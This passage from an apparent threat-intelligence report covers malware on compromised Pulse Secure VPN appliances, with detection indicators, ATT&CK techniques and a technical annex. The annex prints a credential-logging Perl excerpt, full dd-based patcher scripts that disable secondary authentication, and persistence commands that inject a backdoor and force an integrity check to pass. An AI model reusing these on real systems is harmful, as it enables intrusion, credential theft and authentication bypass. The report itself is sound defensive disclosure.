<p>All Pulse Secure Connect customers should assess the impact of the Pulse Secure mitigations and apply it if possible. Organizations should utilize the most recent version of Pulse Secureâ€™s Integrity Assurance utility <a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">released</a> on March 31, 2021. If a device fails this Integrity Assurance utility, network administrators should follow the <a href="https://kb.pulsesecure.net/articles/Pulse_Secure_Article/KB44755">instructions here</a> and contact their Pulse CSR for additional guidance.</p>
<p>Organizations should examine available forensic evidence to determine if an attacker compromised user credentials. Ivanti highly recommends resetting all passwords in the environment and reviewing the configuration to ensure no service accounts can be used to authenticate to the vulnerability.</p>
<p>Additional detections, mitigations and relevant MITRE ATT&amp;CK techniques are included in the Technical Annex. Sample hashes and analysis are included to enable defenders to quickly assess if their respective appliances have been affected. Yara rules, Snort rules, and hashes are published on <a adhocenable="false" href="https://github.com/fireeye/pulsesecure_exploitation_countermeasures/">Mandiantâ€™s GitHub page</a>.</p>
<h4>Detections and Mitigations</h4>
<p><span class="code">1d3ab04e21cfd40aa8d4300a359a09e3b520d39b1496be1e4bc91ae1f6730ecc</span></p>
<ul>
<li>HARDPULSE contains an embedded 'recovery' URL <span class="code">https://ive-host/dana-na/auth/recover[.]cgi?token=&lt;varies&gt;</span> that may be accessed by an attacker. The sample uses the POST parameters <span class="code">checkcode</span>, <span class="code">hashid</span>, <span class="code">m</span>, and <span class="code">filename</span>. This URL is not present in legitimate versions of this file.</li>
</ul>
<p><span class="code">7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a</span></p>
<p><span class="code">68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2</span></p>
<p><span class="code">d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b</span></p>
<ul>
<li>PULSEJUMP, RADIALPULSE AND PACEMAKER use the following files to record credentials:<ul>
<li><span class="code">/tmp/dsactiveuser.statementcounters</span></li>
<li><span class="code">/tmp/dsstartssh.statementcounters</span></li>
<li><span class="code">/tmp/dsserver-check.statementcounters</span></li>
</ul>
</li>
</ul>
<p><span class="code">cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68</span></p>
<ul>
<li>The malicious operations of SLOWPULSE can be detected via log correlation between the authentication servers responsible for LDAP and RADIUS auth and the VPN server. Authentication failures in either LDAP or RADIUS logs with the associated VPN logins showing success would be an anomalous event worthy of flagging.</li>
</ul>
<p><span class="code">a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1</span></p>
<ul>
<li>Upon invocation of the PULSECHECK webshell, the following HTTP request headers will be sent:</li>
</ul>
<table border="0" cellspacing="0" cellpadding="0" width="472">
<tbody><tr><td width="178"><p><b>Key</b></p>
</td>
<td width="294"><p><b>Value</b></p>
</td>
</tr><tr><td width="178"><p><span class="code">REQUEST_METHOD</span></p>
</td>
<td width="294"><p><span class="code">POST</span></p>
</td>
</tr><tr><td width="178"><p><span class="code">HTTP_X_KEY</span></p>
</td>
<td width="294"><p><span class="code">&lt;BackdoorKey&gt;</span></p>
</td>
</tr><tr><td width="178"><p><span class="code">HTTP_X_CNT</span></p>
</td>
<td width="294"><p><span class="code">&lt;RC4Key&gt;</span></p>
</td>
</tr><tr><td width="178"><p><span class="code">HTTP_X_CMD</span></p>
</td>
<td width="294"><p><span class="code">&lt;RC4Command&gt;</span></p>
</td>
</tr></tbody></table>
<p><span class="code">1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd</span></p>
<ul>
<li>SLOWPULSE VARIANT 2 writes ACE logon credentials to the file&nbsp;<span class="code">/home/perl/PAUS.pm</span>&nbsp;in&nbsp;<span class="code">a+</span>&nbsp;(append) mode, using the format string&nbsp;<span class="code">%s:%s\n</span>.</li>
</ul>
<p><span class="code">68743e17f393d1f85ee937dffacc91e081b5f6f43477111ac96aa9d44826e4d2</span></p>
<ul>
<li>PACEMAKER is saved at filepath <span class="code">/home/bin/memread</span></li>
<li>Executed with commandline flags <span class="code">â€“t</span>, <span class="code">-m</span>, <span class="code">-s</span></li>
<li>Attaches to victim processes with PTRACE and opens subfiles in <span class="code">/proc/</span></li>
</ul>
<p><span class="code">88170125598a4fb801102ad56494a773895059ac8550a983fdd2ef429653f079</span></p>
<ul>
<li>THINBLOOD creates the files:<ul>
<li><span class="code">/home/runtime/logs/log.events.vc1</span></li>
<li><span class="code">/home/runtime/logs/log.events.vc2</span></li>
<li><span class="code">/home/runtime/logs/log.access.vc1</span></li>
<li><span class="code">/home/runtime/logs/log.access.vc2</span></li>
</ul>
</li>
<li>Executes the <span class="code">system</span> API with the <span class="code">mv</span> command specifying one of the files above, targeting:<ul>
<li><span class="code">/home/runtime/logs/log.access.vc0</span></li>
<li><span class="code">/home/runtime/logs/log.events.vc0</span></li>
</ul>
</li>
<li>Executes the <span class="code">rm</span> command specify one of the <span class="code">.vc1</span> files above</li>
</ul>
<p><span class="code">133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a</span></p>
<ul>
<li>SLIGHTPULSE uses <span class="code">/tmp/1</span> as command execution log</li>
<li>All POST requests to <span class="code">meeting_testjs.cgi</span> are suspicious</li>
<li>POST parameters: <span class="code">cert</span>, <span class="code">img</span>, <span class="code">name</span> are used by malicious logic</li>
<li>Responses to the endpoint with the <span class="code">name</span> parameter respond with <span class="code">no-cache</span> and <span class="code">image/gif</span></li>
</ul>
<p><span class="code">1741dc0a491fcc8d078220ac9628152668d3370b92a8eae258e34ba28c6473b9</span></p>
<ul>
<li>THINBLOOD execution of sed on the files:<ul>
<li><span class="code">log.events.vc0</span></li>
<li><span class="code">log.access.vc0</span></li>
<li><span class="code">Log.admin.vc0</span></li>
</ul>
</li>
<li>Sed patterns used:<ul>
<li><span class="code">s/.\x00[^\x00]*&lt;regex_string&gt;[^\x00]*\x09.\x00//g</span></li>
<li><span class="code">s/\x&lt;hex_char&gt;\x00[^\x00]*&lt;regex_string&gt;[^\x00]*\x09\x&lt;hex_char&gt;\x00//g</span></li>
</ul>
</li>
</ul>
<p><span class="code">06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7</span></p>
<ul>
<li>The sample accepts an input and output file as its first and second arguments, then writes a patched version of the input out. The commandline argument e or E must be supplied as the fourth argument. Example command line:<ul>
<li><span class="code">./patcher input.bin output.bin backdoorkey e</span></li>
</ul>
</li>
</ul>
<p><span class="code">f2b1bd703c3eb05541ff84ec375573cbdc70309ccb82aac04b72db205d718e90</span></p>
<ul>
<li>The sample uses the HTTP query parameter id and responds with HTTP headers &quot;Cache-Control: no-cache\n&quot; and &quot;Content-type: text/html\n\n&quot;.</li>
</ul>
<p><span class="code">224b7c45cf6fe4547d3ea66a12c30f3cb4c601b0a80744154697094e73dbd450</span></p>
<p><span class="code">64c87520565165ac95b74d6450b3ab8379544933dd3e2f2c4dc9b03a3ec570a7</span></p>
<p><span class="code">78d7c7c9f800f6824f63a99d935a4ad0112f97953d8c100deb29dae24d7da282</span></p>
<p><span class="code">705cda7d1ace8f4adeec5502aa311620b8d6c64046a1aed2ae833e2f2835154f</span></p>
<ul>
<li>Execute sed on PulseSecure system files</li>
<li>Remounts filesystem as writable: <span class="code">system(&quot;/bin/mount -o remount,rw /dev/root /&quot;)</span></li>
<li>Unexpected execution of other system commands such as <span class="code">tar</span>, <span class="code">cp</span>, <span class="code">rm</span></li>
</ul>
<h4>MITRE ATT&amp;CK Techniques</h4>
<p>The following list of MITRE ATT&amp;CK techniques cover all malware samples described in this report as well as those observed throughout the lifecycle of UNC2630 and UNC2717.</p>
<ul>
<li>T1003-OS Credential Dumping</li>
<li>T1016-System Network Configuration Discovery</li>
<li>T1021.001-Remote Desktop Protocol</li>
<li>T1027-Obfuscated Files or Information</li>
<li>T1036.005-Match Legitimate Name or Location</li>
<li>T1048-Exfiltration Over Alternative Protocol</li>
<li>T1049-System Network Connections Discovery</li>
<li>T1053-Scheduled Task/Job</li>
<li>T1057-Process Discovery</li>
<li>T1059-Command and Scripting Interpreter</li>
<li>T1059.003-Windows Command Shell</li>
<li>T1070-Indicator Removal on Host</li>
<li>T1070.001-Clear Windows Event Logs</li>
<li>T1070.004-File Deletion</li>
<li>T1071.001-Web Protocols</li>
<li>T1082-System Information Discovery</li>
<li>T1098-Account Manipulation</li>
<li>T1105-Ingress Tool Transfer</li>
<li>T1111-Two-Factor Authentication Interception</li>
<li>T1133-External Remote Services</li>
<li>T1134.001 Access Token Manipulation: Token Impersonation/Theft</li>
<li>T1136-Create Account</li>
<li>T1140-Deobfuscate/Decode Files or Information</li>
<li>T1190-Exploit Public-Facing Application</li>
<li>T1505.003-Web Shell</li>
<li>T1518-Software Discovery</li>
<li>T1554-Compromise Client Software Binary</li>
<li>T1556.004-Network Device Authentication</li>
<li>T1592.004 Gather Victim Host Information: Client Configurations</li>
<li>T1562 Impair Defenses</li>
<li>T1569.002-Service Execution</li>
<li>T1574 Hijack Execution Flow&nbsp;</li>
<li>T1600-Weaken Encryption</li>
</ul>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig6.png" alt=""><br>
<span class="type-XS">Figure 6: MITRE ATT&amp;CK Map</span></p>
<h4>Technical Annex</h4>
<h5>SLIGHTPULSE</h5>
<p>The file <span class="code">meeting_testjs.cgi</span> (SHA256: <span class="code">133631957d41eed9496ac2774793283ce26f8772de226e7f520d26667b51481a</span>) is a webshell capable of arbitrary file read, write, and command execution. Malicious logic is inserted at the end of legitimate logic to respond to POST requests. We believe this webshell may be responsible for placing additional webshells and used to modify legitimate system components resulting in the other observed malware families due to its functionality.</p>
<p>The malicious logic inserts a branch condition to respond to HTTP POST requests rather than just the typical GET requests expected of the legitimate code. If GET requests are performed the legitimate logic is still invoked. POST requests have a series of parameters checked for existence to determine which command to invoke. This logic is:</p>
<table border="0" cellspacing="0" cellpadding="0">
<tbody><tr><td width="309"><p><b>POST params</b></p>
</td>
<td width="273"><p><b>Invoked Command</b></p>
</td>
</tr><tr><td width="309"><p><span class="code">cert</span></p>
</td>
<td width="273"><p><span class="code">writefile</span></p>
</td>
</tr><tr><td width="309"><p><span class="code">img, name with nonempty value</span></p>
</td>
<td width="273"><p><span class="code">readfile</span></p>
</td>
</tr><tr><td width="309"><p><span class="code">img set to empty string &quot;&quot;, name</span></p>
</td>
<td width="273"><p><span class="code">execcmd</span></p>
</td>
</tr><tr><td width="309"><p><span class="code">anything else</span></p>
</td>
<td width="273"><p><span class="code">invoke original legitimate logic</span></p>
</td>
</tr></tbody></table>
<p><img src="/content/dam/fireeye-www/blog/images/pulse-secure/fig7.png" alt=""><br>
<span class="type-XS">Figure 7: Webshells respond to POSTs</span></p>
<p>All incoming and outgoing requests are base64 encoded/decoded and RC4 encrypted/decrypted. The scheme is simple. The first six characters of the data are a random key generated per request as a sort of nonce, with the static RC4 key appended. This nonce + phrase together act as the RC4 key. The phrase is not sent over the wire, only the nonce. This entire key is then used to encrypt/decrypt payload data that immediately follows the key. The form of data on the wire is:</p>
<p>Outbound/Inbound:</p>
<p><span class="code">&lt;6randbytes&gt;&lt;encrypted_data&gt;<br>
^-RC4NONCE-^</span></p>
<p>Usage:</p>
<p><span class="code">&lt;6randbytes&gt;&lt;rc4_phrase&gt;&lt;encrypted_data&gt;<br>
^-------RC4 KEY--------^</span></p>
<p><i>ReadFile</i></p>
<p>This command accepts a base64 encoded, RC4 encrypted file name via the <span class="code">img</span> parameter and opens it for read. The file contents are read in full then sent back to the attacker as base64 encoded, RC4 encrypted data with the headers <span class="code">&quot;Content-type: application/x-download\n&quot;</span>, and form header <span class="code">&quot;Content-Disposition: attachment; filename=tmp\n\n&quot;</span>.</p>
<p><i>WriteFile</i></p>
<p>This command accepts a base64 encoded, RC4 encrypted filename via the <span class="code">cert</span> parameter, and base64 encoded, RC4 encrypted file data via the parameter <span class="code">md5</span>. The filename is opened in write mode with the file data being written to the file before the file is closed. The results of this command are sent back to the attacker, using the headers <span class="code">&quot;Cache-Control: no-cache\n&quot;</span> and <span class="code">&quot;Content-type: text/html\n\n&quot;</span>.</p>
<p><i>Execute</i></p>
<p>This command accepts a base64 encoded, RC4 encrypted commands via the <span class="code">name</span> parameter. The malicious logic forbids the <span class="code">cd</span> command and will respond with the text <span class="code">Error 404</span> if executed. All other commands will be executed via the <span class="code">system</span> API with output piped to the file <span class="code">/tmp/1</span>. The full system command is <span class="code">&lt;command&gt; &gt;/tmp/1 2&gt;&amp;1</span>. The output of this execution is read and sent back to the attacker base64 encoded, RC4 encrypted. The headers <span class="code">&quot;Cache-Control: no-cache\n&quot;</span> and <span class="code">&quot;Content-type: image/gif\n\n&quot;</span> are used. The response appears to be masquerading as a GIF when sending back this command output.</p>
<h5>RADIALPULSE<i></i></h5>
<p>The file with the SHA256 hash <span class="code">d72daafedf41d484f7f9816f7f076a9249a6808f1899649b7daa22c0447bb37b</span> is a modified Perl script associated with a PulseSecure web-based tool which causes usernames, passwords and information associated with logins to this application to be written to the file <span class="code">/tmp/dsstartssh.statementcounters</span>.</p>
<p>Retrieval of these login credentials must be achieved through other means such as an interactive login or a webshell. Persistence is achieved by the addition of compromised code which is continually served when requesting this PulseSecure webpage.</p>
<p>An excerpt of the code related to credential stealing is shown as follows:</p>
<p><span class="code">my $realmName1 = $signin-&gt;getRealmInfo()-&gt;{name};&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
<p><span class="code">open(*fd, &quot;&gt;&gt;/tmp/dsstartssh.statementcounters&quot;);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
<p><span class="code">syswrite(*fd, &quot;realm=$realmName1 &quot;, 5000); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</span></p>
<p><span class="code">syswrite(*fd, &quot;username=$username &quot;, 5000); &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;</span></p>
<p><span class="code">syswrite(*fd, &quot;password=$password\n&quot;, 5000);&nbsp;</span></p>
<p><span class="code">close(*fd);</span></p>
<h5>SLOWPULSE Variant 1<i></i></h5>
<p>The file <span class="code">libdsplibs.so</span> with SHA256 <span class="code">cd09ec795a8f4b6ced003500a44d810f49943514e2f92c81ab96c33e1c0fbd68</span> is a trojanized ELF shared object belonging to the PulseSecure VPN server. The sample has been modified to bypass specific authentication mechanisms of the LDAP and RADIUS protocols. The sample hardcodes a backdoor key that will silently subvert auth failures if the correct backdoor key is passed, establishing a VPN connection as if auth succeeded. If the backdoor password is not used, authentication will fail as normal.</p>
<p>In multiple locations assembly is written into the padding regions between legitimate functions. As these regions are very small, around 20 bytes, the malicious logic stitches itself together by unconditionally jumping between multiple padding regions. The assembly is written in a way very similar to mid-function hooks, where it is common to push and then pop all flags and registers before and after the injected logic. By preserving registers and flags in this way the malicious logic is able to execute and perform its malicious logic as a passive observer if desired, only effecting the control flow in specific conditions. This is employed in two locations, the LDAP and RADIUS authentication routines, <span class="code">DSAuth::LDAPAuthServer::authenticate</span> and <span class="code">DSAuth::RadiusAuthServer::checkUsernamePassword</span> respectively.</p>
<p><i>LDAP Auth Bypass</i></p>
<p>In the typical execution of <span class="code">DSAuth::LDAPAuthServer::authenticate</span> the legitimate application constructs the C++ object <span class="code">DSAuth::LDAPAuthServer::ldap</span> then passes it to <span class="code">DSLdapServer::bind</span> with the username and password for login. This bind may fail or succeed which determines the authentication failure or success of the LDAP protocol. The malicious logic inserted into the application redirects execution before <span class="code">DSLdapServer::bind</span> just after the ldap object is constructed. At this point in execution the username and password are easily extracted from memory with mid-function hooking techniques, which the sample copies to a code cave in memory between two functions as a temporary storage location. The malicious logic then invokes <span class="code">DSLdapServer::bind</span> as the normal logic would, which sets the return register EAX to 0 or 1 for failure or success. A check is then executed where the temporary password copy made earlier is checked against a hardcoded backdoor password. If this check passes the backdoor logic actives by overwriting EAX to 1 to force the application down the execution path of successful authentication, even though in reality authentication failed.</p>
<h5>RADIUS Two Factor Auth Bypass</h5>
<p>In the typical execution of <span class="code">DSAuth::RadiusAuthServer::checkUsernamePassword</span> the legitimate application sends a RADIUS-2FA auth packet with username and password via <span class="code">RadiusAuthPacket::sendRadiusPacket</span>. The response is then retrieved and parsed by the routine <span class="code">DSAuth::RadiusAuthServer::handleResponse</span>. After packet retrieval the packet type is verified to be 3, it's not known what this packet type specifies but this is the packet type of a successful authentication response. If the packet type check passes, then the sample reads a field of the packet that specifies if authentication was successful or not and then checks this status later. The inserted malicious logic hijacks execution just after <span class="code">DSAuth::RadiusAuthServer::handleResponse</span> where the password sent to the RADIUS server is checked against a backdoor password. If this check passes the malicious logic overwrites the retrieved packet with values indicating that it's of type 3 and that authentication was successful. The malicious logic then rejoins the original execution flow where the packet type is checked. If written the spoofed values force the application down the execution path of successful authentication, even though in reality authentication failed.</p>
<h5>SLOWPULSE Variant 2</h5>
<p><i>ACE Two Factor Auth Credential Logging</i></p>
<p>We also identified a variant of SLOWPULSE (SHA256: <span class="code">1ab50b77dd9515f6cd9ed07d1d3176ba4627a292dc4a21b16ac9d211353818bd</span>) which logs credentials used during ACE-2FA protocol authentication.</p>
<p>The backdoor is implemented in the routine <span class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>. As part of the login procedure the username and password are retrieved then written into a map entry structure. The backdoor inserts an unconditional jump into the logon logic that takes this map entry structure, reads the username and password fields, then writes them to the file <span class="code">/home/perl/PAUS.pm</span> in <span class="code">a+</span> (append) mode, using the format string <span class="code">%s:%s\n</span>. The backdoor then unconditionally jumps back into the normal control flow to continue the logon process as normal.</p>
<h5>SLOWPULSE Variant 3</h5>
<p><i>ACE Two Factor Auth Bypass</i></p>
<p>We Identified another variant of SLOWPULSE (SHA256: <span class="code">b1c2368773259fbfef425e0bb716be958faa7e74b3282138059f511011d3afd9</span>) which is similar to SLOWPULSE VARIANT 2 the malicious logic lives within <span class="code">DSAuth::AceAuthServer::checkUsernamePassword</span>, however this variant bypasses the logon procedure rather than login credentials. Typical execution of this routine calls <span class="code">DsSecID_checkLogin</span> to validate the username and password which sets the EAX register to 1. The routine <span class="code">DSAuth::AceAuthServer::handleACEAuthResult</span> then checks EAX to determine if auth was successful or not. The malicious logic hijacks execution immediately after the username and password fields are written to their map entries, then checks if the password matches the backdoor password. If the password matches, then the EAX register is overwritten to 1. This puts the program in the same state as if <span class="code">DsSecID_checkLogin</span> had successfully executed, but unlike SLOWPULSE VARIANT 1 the original authentication routine is not called at all. The malicious logic then rejoins execution before <span class="code">DSAuth::AceAuthServer::handleACEAuthResult</span> which will now pass. This forces the application down the execution path of successful authentication, even though in reality authentication would have failed.</p>
<h5>SLOWPULSE Variant 4</h5>
<p><i>RealmSignin Two Factor Auth Bypass</i></p>
<p>We identified a fourth variant of SLOWPULSE responsible for bypassing what may be the two-factor authentication step of the <span class="code">DSAuth::RealmSignin</span> process. The backdoor is present within the function <span class="code">DSAuth::RealmSignin::runSigninStep</span>.This routine is responsible for multiple steps of the login procedure and is implemented as a large switch statement. Case 11 of the switch statement typically calls the routines <span class="code">DSMap::setPrivacyKeyNames</span> then <span class="code">DSAuth::RealmSignin::runSecondaryAuth</span>. The malicious logic in this variant overwrites the call to DSAuth::RealmSignin::runSecondaryAuth with mov eax, 1. This forces application flow as if DSAuth::RealmSignin::runSecondaryAuth always succeeds, without ever calling it. We were not able to recover a file with these patches applied as the attacker removed their patches after use. However, we did uncover both the patcher and unpatcher utilities. We do not provide a hash for this file as we have not recovered it from a system in the field. This analysis was performed by replaying the changes performed by the patcher we did recover.</p>
<h5>SLOWPULSE Variant 2 Patcher</h5>
<p>As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original <span class="code">libdsplibs.so</span> file. The file with SHA256: <span class="code">c9b323b9747659eac25cec078895d75f016e26a8b5858567c7fb945b7321722c</span> is responsible for inserting SLOWPULSE V2 malicious logic to log ACE credentials. The patcher accepts two command line arguments, the path to the original binary and the patched output file path. The original binary is read into memory, patched, and then written to the output path. The assembly patches and offsets into the original binary are hardcoded.</p>
<h5>SLOWPULSE Variant 3 Patcher</h5>
<p>&nbsp;As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to insert the malicious logic into the original <span class="code">libdsplibs.so</span> file. The file with SHA256: <span class="code">06c56bd272b19bf7d7207443693cd1fc774408c4ca56744577b11fee550c23f7</span> is responsible for inserting SLOWPULSE V3 malicious logic to bypass ACE logon authentication process. The patcher accepts four arguments. The first argument is the original binary path, the second the patched output file path, third is the backdoor bypass password, and fourth is the letter e specifying to apply patches. The sample reads the original binary into memory, applies the assembly patches associated with SLOWPULSE V3, as well as the provided bypass password, then written to the output path. The assembly patches, and all offsets including where to copy the bypass password are hardcoded.</p>
<h5>SLOWPULSE Variant 4 Patcher</h5>
<p>As part of our investigation into the SLOWPULSE family we recovered the utility the attacker used to insert the malicious logic into the original <span class="code">libdsplibs.so</span> file. The file with SHA256: <span class="code">e63ab6f82c711e4ecc8f5b36046eb7ea216f41eb90158165b82a6c90560ea415</span> responsible for inserting the patch for SLOWPULSE V3. The patch applied overwrites a single call to <span class="code">DSAuth::RealmSignin::runSecondaryAuth</span> with <span class="code">mov eax, 1</span>. This patcher utility is a simple bash script, unlike the previous patchers which were compiled applications likely written in C. The script in full is:</p>
<p><span class="code">printf '\xB8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))<br>
printf '\x01' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32))<br>
printf '\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))<br>
printf '\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34))<br>
printf '\x00' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))</span></p>
<h5>SLOWPULSE Variant 4 UnPatcher</h5>
<p>As part of our investigation into the SLOWPULSE family we were able to recover the utility used by the attacker to remove the malicious logic into the original <span class="code">libdsplibs.so</span> file for SLOWPULSE V4. The attacker chose to remove the patches applied to <span class="code">libdsplibs.so</span>. The file with SHA256:&nbsp;<span class="code">b2350954b9484ae4eac42b95fae6edf7a126169d0b93d79f49d36c5e6497062a</span> is the unpatcher utility for SLOWPULSE V4. This sample is also a simple bash script, in full it is:</p>
<p><span class="code">printf '\xE8' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B31))<br>
printf '\xE2' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B32))<br>
printf '\x08' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B33))<br>
printf '\xD0' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B34))<br>
printf '\xFF' | dd conv=notrunc of=/home/lib/libdsplibs.so bs=1 count=1 seek=$((0x5C7B35))</span></p>
<h5>STEADYPULSE</h5>
<p>The file <span class="code">licenseserverproto.cgi</span> (SHA256: <span class="code">168976797d5af7071df257e91fcc31ce1d6e59c72ca9e2f50c8b5b3177ad83cc</span>) is a webshell implemented via modification of a legitimate Perl script used by a Pulse Secure tool which enables arbitrary command execution.</p>
<p>The attacker inserted two blocks of Perl code that implement the webshell. The source code modifications are surrounded by comments that indicate the start and end of inserted code. The comment strings used are <span class="code">##cgistart1</span>, <span class="code">##cgiend1</span>, <span class="code">##cgistart2</span> and <span class="code">##cgiend2</span>. Although the exact purpose of these comment strings is unknown, the attacker may use them to facilitate updates to the malicious code or to allow for its quick removal if necessary.</p>
<ul>
<li>The Perl script enclosed in the tags <span class="code">##cgistart1</span> and <span class="code">##cgiend1</span> adds several lines to import Perl modules that are used by the webshell. It also adds a function to parse parameters of received command data.</li>
<li>The script enclosed in the tags <span class="code">##cgistart2</span> and <span class="code">##cgiend2</span> is responsible for checking web requests designed to be executed by the webshell, if present. If no webshell request is found, the script passes execution to the legitimate Perl script for the webpage.</li>
</ul>
<p>The webshell portion of the script is invoked when it receives a form submission <span class="code">name=value</span> pair of <span class="code">serverid</span> matching a secret key. This causes the webshell to extract the string passed to it via the <span class="code">QUERY_STRING</span> CGI environment variable. Individual key/value pairs delimited by the <span class="code">&amp;</span> character and are URL decoded. Although the script parses out all key/value pairs it receives, it specifically looks for and extracts data associated with the cmd parameter. If found, it will generate a form containing the extracted cmd to be executed and the previous <span class="code">serverid</span> value along with a form submission button named <span class="code">Run</span>. Upon submission, the webshell will execute the passed command on the victim host's command line and display the results to the attacker before exiting. If no cmd value was extracted, the webshell will simply output a <span class="code">&lt;/pre&gt;</span> HTML tag.</p>
<h5>PULSECHECK<i></i></h5>
<p>The file <span class="code">secid_canceltoken.cgi</span> (SHA256: <span class="code">a1dcdf62aafc36dd8cf64774dea80d79fb4e24ba2a82adf4d944d9186acd1cc1</span>) is a webshell written in Perl that enables arbitrary command execution. With a properly formatted request, the script will execute webshell code. Otherwise, the legitimate welcome page of the Pulse Secure VPN software is presumably invoked.</p>
<p>The script checks for web requests using the HTTP&nbsp;POST&nbsp;method and, if found, will further check the HTTP request headers for the CGI environment variable&nbsp;<span class="code">HTTP_X_KEY</span>. If this header matches a backdoor key, then the malware will output the result of the command sent in the variable&nbsp;<span class="code">HTTP_X_CMD</span>. This data is RC4 encrypted and base64-encoded. The passphrase to decrypt is sent in the environment variable&nbsp;<span class="code">HTTP_X_CNT</span>. The webshell will set the content type to&nbsp;<span class="code">Content-type:text/html</span>&nbsp;and the command output printed. Following this, the script exits.</p>
<h5>QUIETPULSE<i></i></h5>
<p>The file <span class="code">dsserver</span> (SHA256: <span class="code">9f6ac39707822d243445e30d27b8404466aa69c61119d5308785bf4a464a9ebd</span>) is a legitimate Perl script with malicious modifications to fork the child process <span class="code">/home/bin/dshelper</span>. The dshelper script does not exist on a clean PulseSecure installation, this file is described as QUIETPULSE Utility Script.</p>
<h5>QUIETPULSE Utility Script<i></i></h5>
<p>The file <span class="code">dshelper</span> (SHA256: <span class="code">c774eca633136de35c9d2cd339a3b5d29f00f761657ea2aa438de4f33e4bbba4</span>) is a shell script invoked by a malicious version of <span class="code">dsserver</span> that primarily functions as a utility script responsible for copying files and executing commands. Like the ATRIUM patcher, this script accesses /tmp/data, a path which is used during a system upgrade. This file is therefore, like the ATRIUM patcher, used by the attacker to maintain persistence. The script is set to execute in a loop where four main checks are executed every two minutes. The checks are as follows:</p>
<p><i>Check 1</i></p>
<p>If <span class="code">/tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span> exists and is non-empty then execute:</p>
<ul>
<li><span class="code">grep -c -s 'system($depara)' /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li>
</ul>
<p>It checks if the file has the contents <span class="code">system($depara)</span>. If the file does not contain this content, then retrieve the first line of the file by executing:</p>
<ul>
<li><span class="code">sed -n 1p /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li>
</ul>
<p>Then copy a file via:</p>
<ul>
<li><span class="code">cp /home/webserver/htdocs/dana-na/auth/compcheckjava.cgi /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li>
</ul>
<p>Then replace the copyâ€™s first line with the one retrieved from the sed above via:</p>
<ul>
<li><span class="code">sed -i 1c&quot;&lt;varies&gt;&quot; /tmp/data/root/home/webserver/htdocs/dana-na/auth/compcheckjava.cgi</span></li>
</ul>
<p><i>Check 2</i></p>
<p>If <span class="code">/tmp/data/root/home/bin/</span> exists as a directory, then check if the file <span class="code">/tmp/data/root/home/bin/dshelper</span> does not exist. If it does not exist, then place it there by copying a file via:</p>
<ul>
<li><span class="code">cp -p /home/bin/dshelper /tmp/data/root/home/bin/</span></li>
</ul>
<p><i>Check 3</i></p>
<p>If <span class="code">/tmp/data/root/home/bin/dsserver</span> exists and is non-empty then execute the following to check if the file does not contain the string <span class="code">exec(&quot;/home/bin/dshelper&quot;)</span>:</p>
<ul>
<li><span class="code">grep -c -s 'exec(&quot;/home/bin/dshelper&quot;)' /tmp/data/root/home/bin/dsserver</span></li>
</ul>
<p>If it doesn't then execute to insert the line:</p>
<ul>
<li><span class="code">sed -i 's/for (;;)/my $monpid = fork();\nif ($monpid == 0) {\nexec(\&quot;\/home\/bin\/dshelper\&quot;);\n}\n&amp;/g' /tmp/data/root/home/bin/dsserver</span></li>
</ul>
<p><i>Check 4</i></p>
<p>If the file <span class="code">/tmp/data/root/home/bin/check_integrity.sh</span> exists and is non-empty, then check if the file contains the string <span class="code">exit 1</span> by executing:</p>
<ul>
<li><span class="code">grep -c -s 'exit 1' /tmp/data/root/home/bin/check_integrity.sh</span></li>
</ul>
<p>If the file does contain this content, then execute the following to switch the content to <span class="code">exit 0</span>:</p>
<ul>
<li><span class="code">sed -i 's/exit 1/exit 0/g' /tmp/data/root/home/bin/check_integrity.sh</span></li>
</ul>
<h5>PULSEJUMP</h5>
<p>The file with SHA256: <span class="code">7fa71a7f76ef63465cfeacf58217e0b66fc71bc81d37c44380a6f572b8a3ec7a</span> is a system information and credential harvesting Perl script. The sample writes information from multiple sources to the file&nbsp;<span class="code">/tmp/dsactiveuser.statementcounters</span>&nbsp;in append mode.</p>
<p>The sample begins by retrieving all auth servers via the API&nbsp;<span class="code">AuthAdmin::getAllAuthServers</span>. and logs the results. Next, the sample logs all roles via the API&nbsp;<span class="code">DSRole::GeneralAdmin::getRoles</span> and writes the values to the file. The sample may also retrieve and log additional information depending on the device configuration.</p>
<h5>HARDPULSE</h5>
